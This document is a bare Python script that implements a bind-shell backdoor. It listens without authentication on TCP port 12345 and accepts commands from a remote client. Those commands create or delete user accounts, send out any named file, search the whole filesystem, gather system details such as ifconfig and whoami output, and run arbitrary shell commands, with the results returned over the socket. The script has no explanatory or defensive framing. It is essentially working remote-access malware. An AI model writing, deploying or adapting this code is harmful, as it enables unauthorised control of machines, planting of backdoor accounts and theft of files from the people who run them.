import subprocess, socket, time, struct,re,os

def create_user(name,pwd):
    cmd = ["useradd" , name , "-p" , pwd]
    subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    return

def delete_user(name):
    cmd = ['deluser',name]
    subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    return

def download_file(file_name,sock):
    f = open(file_name, "r")
    sock.send(f.read())
    return
        
def search_drive(file_name,sock): #DRIVESEARCH
    re_obj = re.compile(file_name)
    for root, dirs, files in os.walk("/"):
        for i in files:
            if(re.search(re_obj,i)):
                sock.send(os.path.join(root,i))
    time.sleep(1)
    sock.send("done")
    return

def gather_information(log_name,sock):
    cmd_list = ["ifconfig",
                "users",
                "pwd",
                "whoami"]
    
    f = open(log_name, "w")
    for cmd in cmd_list:
        subprocess.Popen(cmd, stdout=f, stderr=f)
    f.close()
    download_file(log_name,sock)
    return
    
def execute_command(cmd,sock):
    try:
        running_command = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        out_err = running_command.communicate()
        sock.send(out_err[0]+" "+out_err[1])
    except:
        sock.send("invalid command")
    return
    
def get_data(sock, str_to_send):
    sock.send(str_to_send)
    data = sock.recv(1024)
    return data    

def main():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.bind(('',12345))
    listen_sock.listen(1)
    client_sock, client_data = listen_sock.accept()
    while True:
        time.sleep(1)
        cmd = get_data(client_sock, "COMMAND: ")
        
        if cmd == "CU":
            name = get_data(client_sock,"name: ")
            pwd = get_data(client_sock,"Password: ")
            create_user(name, pwd)
            
        if cmd == "DU":
            name = get_data(client_sock,"Username: ")
            delete_user(name)
            
        if cmd == "DF":
            name = get_data(client_sock,"Filename: ")
            download_file(name,client_sock)
            
        if cmd == "GI":
            name = get_data(client_sock,"Log Name: ")
            gather_information(name,client_sock)
            
        if cmd == "EC":
            cmd = get_data(client_sock,"Command to execute: ")
            execute_command(cmd,client_sock)
          
        if cmd == "SCH":
            file_name = get_data(client_sock,"file name : ")
            search_drive(file_name,client_sock)
            
    return
    
main()
